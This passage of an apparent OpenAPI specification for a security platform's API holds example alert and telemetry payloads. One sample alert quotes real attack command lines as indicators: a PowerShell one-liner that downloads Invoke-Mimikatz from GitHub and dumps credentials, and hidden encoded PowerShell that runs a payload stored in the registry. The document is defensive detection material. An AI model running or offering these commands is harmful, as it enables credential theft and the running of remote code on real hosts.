            "workbenchId": "WB-9002-20220909-00111",
            "workbenchLink": "https://THE_WORKBENCH_URL",
            "alertProvider": "TI",
            "model": "Threat Intelligence Sweeping",
            "campaign": "Soula",
            "industry": "n/a",
            "region/country": "eastern-asia/Korea (the Republic of)",
            "createdBy": "Trend Micro Research",
            "totalIndicatorNumber": 9,
            "matchedIndicatorNumber": 1,
            "reportLink": "https://THE_TI_REPORT_URL",
            "score": "42",
            "modelSeverity": "medium",
            "alertTriggerTimestamp": "2022-09-09T09:04:11.076Z",
            "workbenchCompleteTimestamp": "2022-09-09T09:04:36Z",
            "impactScope": [
              {
                "entityValue": {
                  "guid": "2E7EC0A5-6686-4BE0-BAF8-AD3C2DA19A0D",
                  "name": "M1-Max",
                  "ips": [
                    "10.64.25.134"
                  ]
                },
                "entityId": "2E7EC0A5-6686-4BE0-BAF8-AD3C2DA19A0D",
                "managementScopeGroupId": "deadbeef-292e-42ae-86be-d2fef483a248",
                "relatedEntities": [],
                "relatedIndicators": [
                  1
                ],
                "entityType": "host"
              },
              {
                "entityValue": {
                  "guid": "D7E9EC75-4072-2D48-01EF-7A6A95FAD384",
                  "name": "testdeMacBook-Pro",
                  "ips": [
                    "10.64.18.27"
                  ]
                },
                "entityId": "D7E9EC75-4072-2D48-01EF-7A6A95FAD384",
                "managementScopeGroupId": "deadbeef-292e-42ae-86be-d2fef483a248",
                "relatedEntities": [],
                "relatedIndicators": [
                  1
                ],
                "entityType": "host"
              }
            ],
            "indicators": [
              {
                "id": 1,
                "objectType": "filename",
                "objectValue": "goog-phish-proto-1.vlpset",
                "relatedEntities": [
                  "2E7EC0A5-6686-4BE0-BAF8-AD3C2DA19A0D",
                  "D7E9EC75-4072-2D48-01EF-7A6A95FAD384"
                ],
                "matchedIndicatorPatterns": [
                  "3d206434-58eb-42e4-8355-44ddd394850c"
                ],
                "firstSeen": [
                  "2022-07-27T03:00:47.000Z",
                  "2022-08-16T09:15:06.000Z"
                ],
                "lastSeen": [
                  "2022-07-28T01:25:52.000Z",
                  "2022-08-17T07:05:34.000Z"
                ]
              }
            ],
            "matchedIndicatorPatterns": [
              {
                "id": "3d206434-58eb-42e4-8355-44ddd394850c",
                "pattern": "[file:name = 'goog-phish-proto-1.vlpset']",
                "tags": [
                  "STIX2.malicious-activity"
                ],
                "matchedLogs": [
                  "Lengthy log string"
                ]
              }
            ]
          }
        },
        "summary": "TI workbench details"
      },
      "awb-WorkbenchHistoryV2SAEDetailsExample": {
        "value": {
          "info": {
            "code": 3008000,
            "msg": "Retrieve workbench summary information successfully."
          },
          "data": {
            "totalCount": 1,
            "modelList": [
              "Heartbeat Model",
              "Possible APT Attack",
              "Suspicious Web Access After Suspicious Email"
            ],
            "workbenchRecords": [
              {
                "investigationStatus": 0,
                "status": 1,
                "investigationResult": 0,
                "priorityScore": 64,
                "workbenchName": "Credential Dumping via Mimikatz",
                "workbenchId": "WB-9002-20220906-00023",
                "workbenchLink": "https://THE_WORKBENCH_URL",
                "createdTime": "2022-09-06T02:49:30Z",
                "updatedTime": "2022-09-06T02:49:50Z",
                "severity": "high",
                "modelId": "1ebd4f91-4b28-40b4-87f5-8defee4791d8",
                "modelType": "preset",
                "impactScope": {
                  "desktopCount": 1,
                  "serverCount": 0,
                  "accountCount": 1,
                  "emailAddressCount": 1,
                  "containerCount": 1,
                  "cloudIdentityCount": 1
                },
                "caseId": "CL-12345-20230718-00012",
                "ownerIds": [
                  "12345678-1234-1234-1234-123456789012"
                ],
                "detail": {
                  "schemaVersion": "1.12",
                  "alertProvider": "SAE",
                  "description": "A user obtained account logon information that can be used to access remote systems via Mimikatz.",
                  "alertTriggerTimestamp": "2022-09-06T02:46:43.650Z",
                  "workbenchCompleteTimestamp": "2022-09-06T02:49:30Z",
                  "impactScope": [
                    {
                      "entityValue": "shockwave\\sam",
                      "entityId": "shockwave\\sam",
                      "relatedEntities": [
                        "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
                      ],
                      "relatedIndicators": [],
                      "entityType": "account",
                      "customTags": [],
                      "platformTags": []
                    },
                    {
                      "entityValue": {
                        "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
                        "name": "nimda",
                        "ips": [
                          "10.10.58.51"
                        ]
                      },
                      "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
                      "managementScopeGroupId": "deadbeef-292e-42ae-86be-d2fef483a248",
                      "managementScopeInstanceId": "1babc299-52de-44f4-a1d2-8a224f391eee",
                      "managementScopePartitionKey": "4c1850c0-8a2a-4637-9f88-6afbab54dd79",
                      "relatedEntities": [
                        "shockwave\\sam"
                      ],
                      "relatedIndicators": [
                        1,
                        2,
                        3,
                        4,
                        5,
                        6,
                        7
                      ],
                      "entityType": "host",
                      "customTags": [
                        {
                          "key": "Department",
                          "value": "finance"
                        },
                        {
                          "key": "Department",
                          "value": "engineer"
                        }
                      ],
                      "platformTags": [
                        {
                          "key": "Asset group",
                          "value": "eu"
                        },
                        {
                          "key": "Asset group",
                          "value": "us"
                        }
                      ]
                    },
                    {
                      "entityValue": "support@pctutordetroit.com",
                      "entityId": "SUPPORT@PCTUTORDETROIT.COM",
                      "relatedEntities": [],
                      "relatedIndicators": [],
                      "entityType": "emailAddress",
                      "customTags": [],
                      "platformTags": []
                    },
                    {
                      "entityValue": "k8s_democon_longrunl_default_09451f51-7124-4aa5-a5c4-ada24efe9da9_0",
                      "entityId": "7d1e00176d78b2b1db0744a187314bf2ce39f3a7d43137c366ae6785e8a4f496",
                      "relatedEntities": [],
                      "relatedIndicators": [],
                      "entityType": "container",
                      "customTags": [
                        {
                          "key": "Department",
                          "value": "finance"
                        },
                        {
                          "key": "Department",
                          "value": "engineer"
                        }
                      ],
                      "platformTags": [
                        {
                          "key": "Asset group",
                          "value": "eu"
                        },
                        {
                          "key": "Asset group",
                          "value": "us"
                        }
                      ]
                    },
                    {
                      "entityValue": "arn:aws:sts::985266316733:assumed-role/aad-admin/loki",
                      "entityId": "arn:aws:sts::985266316733:assumed-role/aad-admin/loki",
                      "relatedEntities": [],
                      "relatedIndicators": [],
                      "entityType": "cloudIdentity",
                      "customTags": [],
                      "platformTags": []
                    }
                  ],
                  "indicators": [
                    {
                      "id": 1,
                      "objectType": "command_line",
                      "objectField": "objectCmd",
                      "objectValue": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe \"iex (new-object net.webclient).downloadstring(\" \"https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1); invoke-mimikatz -dumpcreds\"",
                      "relatedEntities": [
                        "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
                      ],
                      "filterId": [
                        "49d327c4-361f-43f0-b66c-cab433495e42"
                      ]
                    },
                    {
                      "id": 2,
                      "objectType": "command_line",
                      "objectField": "processCmd",
                      "objectValue": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -enc ......acqaswapackafabjaeuawaa=",
                      "relatedEntities": [
                        "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
                      ],
                      "filterId": [
                        "49d327c4-361f-43f0-b66c-cab433495e42"
                      ]
                    },
                    {
                      "id": 3,
                      "objectType": "command_line",
                      "objectField": "parentCmd",
                      "objectValue": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -c $x=$((gp hkcu:software\\microsoft\\windows update).update); powershell -nop -noni -w hidden -enc $x",
                      "relatedEntities": [
                        "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
                      ],
                      "filterId": [
                        "49d327c4-361f-43f0-b66c-cab433495e42"
                      ]
                    },
                    {
                      "id": 4,
                      "objectType": "file_sha1",
                      "objectField": "objectFileHashSha1",
                      "objectValue": "1B3B40FBC889FD4C645CC12C85D0805AC36BA254",
                      "relatedEntities": [
                        "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
                      ],
                      "filterId": [
                        "49d327c4-361f-43f0-b66c-cab433495e42"
                      ]
                    },
                    {
                      "id": 5,
                      "objectType": "fullpath",
                      "objectField": "objectFilePath",
                      "objectValue": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                      "relatedEntities": [
                        "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
                      ],
                      "filterId": [
                        "49d327c4-361f-43f0-b66c-cab433495e42"
                      ]
                    },
                    {
                      "id": 6,
                      "objectType": "fullpath",
                      "objectField": "processFilePath",
                      "objectValue": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                      "relatedEntities": [
                        "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
                      ],
                      "filterId": [
                        "49d327c4-361f-43f0-b66c-cab433495e42"
                      ]
                    },
                    {
                      "id": 7,
                      "objectType": "text",
                      "objectField": "endpointHostName",
                      "objectValue": "Nimda",
                      "relatedEntities": [
                        "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
                      ],
                      "filterId": [
                        "49d327c4-361f-43f0-b66c-cab433495e42"
                      ]
                    }
                  ],
                  "matchedRules": [
                    {
                      "id": "1288958d-3062-4a75-91fc-51b2a49bc7d7",
                      "name": "Potential Credential Dumping via Mimikatz",
                      "matchedFilters": [
                        {
                          "id": "49d327c4-361f-43f0-b66c-cab433495e42",
                          "name": "Possible Credential Dumping via Mimikatz",
                          "timestamp": "2022-09-05T03:53:57.199Z",
                          "mitreTechniques": [
                            "V9.T1003.001",
                            "V9.T1059.003",
                            "V9.T1212"
                          ],
                          "matchedEvents": [
                            {
                              "uuid": "e168a6e5-27b1-462b-ad3e-5146df4e6aa5",
                              "timestamp": "2022-09-05T03:53:57.199Z"
                            }
                          ]
                        }
                      ]
                    }
                  ]
                }
              }
            ]
          }
        },
        "summary": "SAE workbench details"
      },
      "awb-WorkbenchHistoryV2TIDetailsExample": {
        "value": {
          "info": {
            "code": 3008000,
            "msg": "Retrieve workbench summary information successfully."
          },
          "data": {
            "totalCount": 1,
            "modelList": [
              "Heartbeat Model",
              "Possible APT Attack",
              "Suspicious Web Access After Suspicious Email"
            ],
            "workbenchRecords": [
              {
                "investigationStatus": 0,
                "status": 1,
                "investigationResult": 0,
                "priorityScore": 42,
                "workbenchName": "Threat Intelligence Sweeping",
                "workbenchId": "WB-9002-20220908-00030",
                "workbenchLink": "https://THE_WORKBENCH_URL",
                "createdTime": "2022-09-08T02:36:30Z",
                "updatedTime": "2022-09-08T02:36:30Z",
                "severity": "medium",
                "modelId": "report--12ea4e6c-2b13-44e4-94a9-4cc8da461258",
                "modelType": "preset",
                "impactScope": {
                  "desktopCount": 2,
                  "serverCount": 0,
                  "accountCount": 0,
                  "emailAddressCount": 1,
                  "containerCount": 1,
                  "cloudIdentityCount": 1
                },
                "caseId": "CL-12345-20230718-00012",
                "ownerIds": [
                  "12345678-1234-1234-1234-123456789012"
                ],
                "detail": {
                  "schemaVersion": "1.3",
                  "alertProvider": "TI",
                  "campaign": "n/a",
                  "industry": "n/a",
                  "region/country": "n/a",
                  "createdBy": "n/a",
                  "totalIndicatorNumber": 9,
                  "matchedIndicatorNumber": 1,
                  "reportLink": "https://THE_TI_REPORT_URL",
                  "alertTriggerTimestamp": "2022-09-08T02:36:05.578Z",
                  "workbenchCompleteTimestamp": "2022-09-08T02:36:30Z",
                  "impactScope": [
                    {
                      "entityValue": {
                        "guid": "D7E9EC75-4072-2D48-01EF-7A6A95FAD384",
                        "name": "testdeMacBook-Pro",
                        "ips": [
                          "10.64.18.27"
                        ]
                      },
                      "entityId": "D7E9EC75-4072-2D48-01EF-7A6A95FAD384",
                      "managementScopeGroupId": "deadbeef-292e-42ae-86be-d2fef483a248",
                      "managementScopeInstanceId": "1babc299-52de-44f4-a1d2-8a224f391eee",
                      "managementScopePartitionKey": "4c1850c0-8a2a-4637-9f88-6afbab54dd79",
                      "relatedEntities": [],
                      "relatedIndicators": [
                        1
                      ],
                      "entityType": "host",
                      "customTags": [
                        {
                          "key": "Department",
                          "value": "finance"
                        },
                        {
                          "key": "Department",
                          "value": "engineer"
                        }
                      ],
                      "platformTags": [
                        {
                          "key": "Asset group",
                          "value": "eu"
                        },
                        {
                          "key": "Asset group",
                          "value": "us"
                        }
                      ]
                    },
                    {
                      "entityValue": {
                        "guid": "2E7EC0A5-6686-4BE0-BAF8-AD3C2DA19A0D",
                        "name": "M1-Max",
                        "ips": [
                          "10.64.25.134"
                        ]
                      },
                      "entityId": "2E7EC0A5-6686-4BE0-BAF8-AD3C2DA19A0D",
                      "managementScopeGroupId": "deadbeef-292e-42ae-86be-d2fef483a248",
                      "managementScopeInstanceId": "1babc299-52de-44f4-a1d2-8a224f391eee",
                      "managementScopePartitionKey": "4c1850c0-8a2a-4637-9f88-6afbab54dd79",
                      "relatedEntities": [],
                      "relatedIndicators": [
                        1
                      ],
                      "entityType": "host",
                      "customTags": [
                        {
                          "key": "Department",
                          "value": "finance"
                        },
                        {
                          "key": "Department",
                          "value": "engineer"
                        }
                      ],
                      "platformTags": [
                        {
                          "key": "Asset group",
                          "value": "eu"
                        },
                        {
                          "key": "Asset group",
                          "value": "us"
                        }
                      ]
                    },
                    {
                      "entityValue": "support@pctutordetroit.com",
                      "entityId": "SUPPORT@PCTUTORDETROIT.COM",
                      "relatedEntities": [],
                      "relatedIndicators": [],
                      "entityType": "emailAddress",
                      "customTags": [],
                      "platformTags": []
                    },
                    {
                      "entityValue": "k8s_democon_longrunl_default_09451f51-7124-4aa5-a5c4-ada24efe9da9_0",
                      "entityId": "7d1e00176d78b2b1db0744a187314bf2ce39f3a7d43137c366ae6785e8a4f496",
                      "relatedEntities": [],
                      "relatedIndicators": [],
                      "entityType": "container",
                      "customTags": [
                        {
                          "key": "Department",
                          "value": "finance"
                        },
                        {
                          "key": "Department",
                          "value": "engineer"
                        }
                      ],
                      "platformTags": [
                        {
                          "key": "Asset group",
                          "value": "eu"
                        },
                        {
                          "key": "Asset group",
                          "value": "us"
                        }
                      ]
                    },
                    {
                      "entityValue": "arn:aws:sts::985266316733:assumed-role/aad-admin/loki",
                      "entityId": "arn:aws:sts::985266316733:assumed-role/aad-admin/loki",
                      "relatedEntities": [],
                      "relatedIndicators": [],
                      "entityType": "cloudIdentity",
                      "customTags": [],
                      "platformTags": []
                    }
                  ],
                  "indicators": [
                    {
                      "id": 1,
                      "objectType": "filename",
                      "objectFields": [
                        []
                      ],
                      "objectValue": "goog-phish-proto-1.vlpset",
                      "relatedEntities": [
                        "2E7EC0A5-6686-4BE0-BAF8-AD3C2DA19A0D",
                        "D7E9EC75-4072-2D48-01EF-7A6A95FAD384"
                      ],
                      "matchedIndicatorPatterns": [
                        "d0790408-d415-41a5-9872-0d119335cbc4"
                      ],
                      "firstSeen": [
                        "2022-07-27T03:00:47.000Z",
                        "2022-08-16T09:15:06.000Z"
                      ],
                      "lastSeen": [
                        "2022-07-28T01:25:52.000Z",
                        "2022-08-17T07:05:34.000Z"
                      ]
                    }
                  ],
                  "matchedIndicatorPatterns": [
                    {
                      "id": "d0790408-d415-41a5-9872-0d119335cbc4",
                      "pattern": "[file:name = 'goog-phish-proto-1.vlpset']",
                      "tags": [
                        "STIX2.malicious-activity"
                      ],
                      "matchedLogs": [
                        "Lengthy log string"
                      ]
                    }
                  ]
                }
              }
            ]
          }
        },
        "summary": "TI workbench details"
      },
      "ase-messageActivityDataExample": {
        "value": {
          "logs": [
            {
              "mail_message_sender": "xxx@maildomain.com",
              "mail_message_recipient": [
                "yyy@maildomain"
              ],
              "mail_message_subject": "test123",
              "mailbox": "yyy@maildomain",
              "mail_urls": [
                "https://www.trendmicro.com/"
              ],
              "source_domain": "domain.com",
              "source_ip": "1.1.1.1",
              "mail_message_delivery_time": "2020-09-27T23:28:27.000Z",
              "mail_message_id": "<5772876ad1654da29ac3c9d470477837@maildomain.com>",
              "mail_unique_id": "AAMkADllYTcxODA4LWYzZDQtNGI3Ny1iNjFkLTc4NGJmM2M2M2NlOQBGAAAAAADS4iErPwU8Tav4gGK0eC4TBwD1R8CjNBg8T5OK7jBOttj5AAAAAAEMAAD1R8CjNBg8T5OK7jBOttj5AAAydH7NAAA=",
              "mail_attachments": [
                {
                  "file_sha1": "34924b49e416befd1106cad406d413e6e4a89563"
                },
                {
                  "file_name": "test.txt"
                }
              ],
              "mail_internet_headers": [
                {
                  "Value": "xxxx@gmail.com",
                  "HeaderName": "From"
                },
                {
                  "Value": "xxxxx@gmail.com",
                  "HeaderName": "Return-Path"
                }
              ],
              "searchDL": "CAS",
              "eventTime": 1601249307000
            }
          ]
        }
      },
      "ase-endpointActivityDataExample": {
        "value": {
          "items": [
            {
              "dpt": null,
              "dst": "",
              "endpointGuid": "473d1039-df00-3184-0eb0-b723168bce06",
              "endpointHostName": "xxx-docker",
              "endpointIp": [
                "100.200.150.250"
              ],
              "eventId": 1,
              "eventSubId": 2,
              "eventTime": 1602729658866,
              "eventTimeDT": "2020-10-12T02:40:58.866000+00:00",
              "hostName": "",
              "logonUser": [
                "root"
              ],
              "objectCmd": "",
              "objectFileHashSha1": "7dba29e6821c814559a39976dc78584aabd91234",
              "objectFilePath": "/opt/ds_app/ds_app",
              "objectHostName": "",
              "objectIp": "",
              "objectIps": null,
              "objectPort": null,
              "objectRegistryData": "",
              "objectRegistryKeyHandle": "",
              "objectRegistryValue": "",
              "objectSigner": null,
              "objectSignerValid": null,
              "objectUser": "root",
              "parentCmd": "",
              "parentFileHashSha1": "",
              "parentFilePath": "",
              "processCmd": "",
              "processFileHashSha1": "aaaa29e6821c814559a39976dc78584aabd91234",
              "processFilePath": "/opt/ds_app/ds_app",
              "productCode": "xxx",
              "request": "",
              "spt": null,
              "src": "",
              "srcFileHashSha1": "",
              "srcFilePath": "",
              "tags": null,
              "searchDL": "SDL",
              "os": "Linux"
            }
          ]
        }
      },
      "ase-detectionsEndpointExample": {
        "value": {
          "items": [
            {
              "fileName": "snap-xxxx-1246.xxxx",
              "rt": "2020-10-15T01:16:32Z",
              "interestedIp": "192.168.47.102",
              "pver": "20.0.0.877",
              "rtHour": 1,
              "suid": "root",
              "senderGUID": "CE11DF0D-0CFF-CD82-D23E-ACE18C5E1B18",
              "endpointHostName": "xxx-docker",
              "mpver": "Deep Security/20.0.222",
              "cat": 50,
              "filePathName": "/etc/systemd/system/snap-xxxx-1246.xxxx",
              "mDeviceGUID": "C5B09EDD-C725-907F-29D9-B8C30D18C48F",
              "deviceProcessName": "/snap/core/10126/usr/lib/snapd/snapd",
              "fileOperation": "Deleted",
              "eventName": "INTEGRITY_MONITORING_EVENT",
              "ruleName": "Unix - File attributes changed in /etc location",
              "endpointGUID": "473D1039-DF00-3184-0EB0-B723168BCE06",
              "rtDate": "2020-10-15",
              "ruleId": 1003513,
              "severity": 6,
              "eventId": "100117",
              "pname": "Trend Micro Deep Security",
              "filePath": "/etc/systemd/system",
              "ticReceivedTime": "2020-10-15T01:34:05.475Z",
              "hostId": 67,
              "endpointIp": "111.111.111.111",
              "detectionType": "File",
              "mpname": "Cloud One - Workload Security",
              "interestedHost": "xxx-docker",
              "rtWeekDay": "Thursday",
              "rt_utc": "2020-10-15T01:16:32Z",
              "searchDL": "DDL",
              "eventTime": 1602724592000
            }
          ]
        }
      },
      "ase-detectionsMailExample": {
        "value": {
          "items": [
            {
              "interestedIp": "10.200.200.250",
              "pver": "5.7.1111",
              "hostSeverity": 1,
              "dvc": "10.100.100.200",
              "act": "not blocked",
              "malType": "OTHERS",
              "appGroup": "TCP",
              "vLANId": 4095,
              "deviceRiskConfidenceLevel": 3,
              "eventName": "SECURITY_RISK_DETECTION",
              "rtDate": "2020-10-15",
              "ruleId": 4142,
              "hasdtasres": "No",
              "ircUserName": "DigiCert SHA2 Secure Server CA",
              "shost": "40.190.200.200",
              "techniqueId": [
                "T1043",
                "T1032",
                "T1071"
              ],
              "app": "HTTPS",
              "eventId": "100119",
              "srcZone": "0",
              "pname": "Deep Discovery Inspector",
              "dstZone": "1",
              "peerHost": "40.190.200.200",
              "detectionType": "1",
              "ja3sHash": "aaafe5d15ae567fb35fd7837f0116bbb",
              "threatType": "2",
              "fileSize": "0",
              "spt": 443,
              "domainName": "Microsoft Corporation",
              "malTypeGroup": "Others",
              "interestedHost": "xxxxxx.xxx.xx.xxx.com",
              "tacticId": "TA0011",
              "rtWeekDay": "Thursday",
              "deviceDirection": "inbound",
              "dhost": "xxxxxx.xxx.xx.xxx.com",
              "mailMsgSubject": "xxx.xxxx.com",
              "rt_utc": "2020-10-15T03:57:11Z",
              "deviceMacAddress": "00:11:22:33:44:55",
              "dceHash1": "0",
              "hostName": "DigiCert Inc",
              "aptRelated": "0",
              "dceHash2": "0",
              "rt": "2020-10-15T11:57:11+08:00",
              "aggregatedCount": "1",
              "dmac": "00:11:22:33:44:55",
              "dst": "10.100.110.120",
              "dstGroup": "My Company 5F",
              "smac": "00:22:33:44:55:66",
              "rtHour": 11,
              "senderGUID": "95E2AE18FD65-43159B6D-A071-F033-3274",
              "pComp": "NCIE",
              "deviceGUID": "95E2AE18FD65-43159B6D-A071-F033-3274",
              "dvchost": "xxxx-209",
              "interestedGroup": "My Company 5F",
              "ruleName": "SSL Connection",
              "compressedFileSize": "0",
              "senderIp": "10.100.100.200",
              "targetShare": "Washington",
              "severity": 2,
              "src": "40.90.23.154",
              "cnt": "1",
              "ticReceivedTime": "2020-10-15T03:57:22.309Z",
              "dpt": 65379,
              "overSsl": "Not over SSL/TLS",
              "devicePayloadId": "2:33725804:::",
              "mitreMapping": [
                "T1032 (TA0011)",
                "T1043 (TA0011)",
                "T1071 (TA0011)"
              ],
              "peerIp": "40.190.200.200",
              "clientFlag": "dst",
              "potentialRisk": "1",
              "remarks": "[\"CN: xxx.xxxx.com\", \"JA3S: 67bfe5d15ae567fb35fd7837f0116eec\"]",
              "searchDL": "DDL",
              "eventTime": 1602734231000
            }
          ]
        }
      },
      "ase-networkActivityDataExample": {
        "value": {
          "items": [
            {
              "flow_id": 6869615772654816000,
              "eth_src": "00-9a-00-9a-00-9a",
              "eth_dest": "12-34-56-78-9a-bc",
              "ip_src": "10.100.100.100",
              "ip_dest": "133.133.133.133",
              "snsr_id": "0721a14ce3cf4241b19da64f70bd5b45",
              "proto": "HTTPS",
              "start_ts": 1599457062.452471,
              "end_ts": 1599457062.539947,
              "day": 18512,
              "src_port": "57567",
              "dest_port": "443",
              "tcp_or_udp": "TCP",
              "server_name": "xxx.xxxxxx.com",
              "valid_from": "2020-08-19T14:19:53Z",
              "valid_until": "2020-11-11T14:19:53Z",
              "cn": "xxx.xxxxx.xxxxxx.com",
              "issuer": "/C=US/O=xxxxxx Trust Services/CN=xxx CA 1O1",
              "s_no": "91167CC98938D594080000000054CDDD",
              "hash": "6830b3d9acd8466600b49dfd5819351a0a006ddd",
              "ja3_hash": "28a2c9bd18a11de089ef85a160da2ddd",
              "ja3s_hash": "eca9b8f0f3eae50309eaf901cb822ddd",
              "src_host_info": {
                "ip": "10.100.100.100",
                "macaddr": "",
                "hostname": "xxxx",
                "username": "",
                "ssid": "",
                "ap_ip": "",
                "realm": "xxxx.local",
                "domain": "",
                "fqdn": "",
                "ts": 1599447808,
                "orig_hostname": "xxxx"
              }
            }
          ]
        }
      }
    },
    "securitySchemes": {
      "bearerAuth": {
        "type": "http",
        "scheme": "bearer",
        "bearerFormat": "JWT"
      },
      "BearerAuthToken": {
        "description": "The bearer token for authentication.\n\nAdd the Trend Vision One API key to the `Authorization` header using the format `Bearer {token}`.",
        "type": "http",
        "scheme": "bearer",
        "bearerFormat": "JWT"
      },
      "BearerAuth": {
        "bearerFormat": "JWT",
        "scheme": "bearer",
        "type": "http"
      },
      "HTTPBearer": {
        "type": "http",
        "scheme": "bearer",
        "bearerFormat": "JWT"
      },
      "bearerAuthToken": {
        "description": "The bearer token for authentication.\n\nAdd the Trend Vision One API key to the `Authorization` header using the format `Bearer {token}`.\n",
        "type": "apiKey",
        "name": "Authorization",
        "in": "header"
      }
    }
  }
}